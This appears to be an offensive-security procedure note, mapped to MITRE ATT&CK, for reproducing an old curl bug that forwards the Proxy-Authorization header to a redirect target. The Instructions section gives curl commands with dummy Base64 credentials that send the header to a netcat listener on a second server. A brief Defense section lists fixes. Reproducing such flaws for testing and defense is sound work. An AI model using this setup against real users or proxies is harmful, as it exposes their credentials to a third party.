---
tags:
  - curl
  - proxy-auth
  - leakage
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/curl-with-proxy-auth-redirect]]'
verified: false
platforms:
  - macOS
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unsecured Credentials]]'
updated_at: '2025-12-14T17:28:36.556Z'
sub_techniques: []
id: 601b6f30-285d-4c29-8223-383c799d81ec
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
---
# Trigger-Proxy-Header-Leakage-with-curl

## Summary

This procedure uses curl to send an HTTP request with a Proxy-Authorization header to the redirect server, following the -L flag to trigger the redirect, resulting in the header being leaked to the target listener server.

## Description

Curl's vulnerability causes it to forward the Proxy-Authorization header (intended for proxies) to the new host after redirect, exposing Base64-encoded credentials. This test uses a custom header and -L to follow the 302 redirect from Server1 to Server2. Tested on curl 7.64.1; impacts scenarios with proxy auth over HTTP redirects. Requires curl installed and servers set up.

## Requirements

1. Curl version vulnerable to this issue (pre-patch, e.g., 7.64.1)
2. Network access to Server1:8000
3. Base64-encoded proxy credentials for testing
4. Active listener on Server2:8081

## Defense

Defensive measures and detection strategies:

- Update curl to latest version (post-2019 patches fix this)
- Avoid -L with sensitive headers; use --proto-redir to control redirects
- Proxy servers should enforce header stripping; monitor logs for leaked creds

## Objectives

1. Demonstrate header forwarding flaw in curl redirects
2. Leak proxy credentials to unintended endpoint
3. Confirm interception via unencrypted HTTP

## Instructions

### Step 1: Prepare curl Command

**Context**: Construct the request with Proxy-Authorization header set to dummy Basic auth.

**Command** ([[commands/curl-with-proxy-auth-redirect]]):
```bash
curl -H "Proxy-Authorization: Basic dXNlcjpwYXNz" http://server1:8000 -L -v
```

> The -v flag adds verbose output to see redirect details. 'dXNlcjpwYXNz' is Base64 for 'user:pass'. Expected: Follows redirect, sends GET to server2:8081.

### Step 2: Execute and Observe

**Context**: Run the command and check the netcat listener for leaked header.

**Command** ([[commands/curl-with-proxy-auth-redirect]]):
```bash
curl -H "Proxy-Authorization: Basic xxx==" http://server1:8000 -L
```

> In netcat: See 'Proxy-Authorization: Basic xxx==' in the request headers, confirming leakage.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Unsecured Credentials]] Unsecured Credentials

### Sub-Techniques


## Commands Used

- [[commands/curl-with-proxy-auth-redirect]]

## Tools Used

- [[tools/curl]]

## Tags

- curl
- http-redirect
- credential-leak
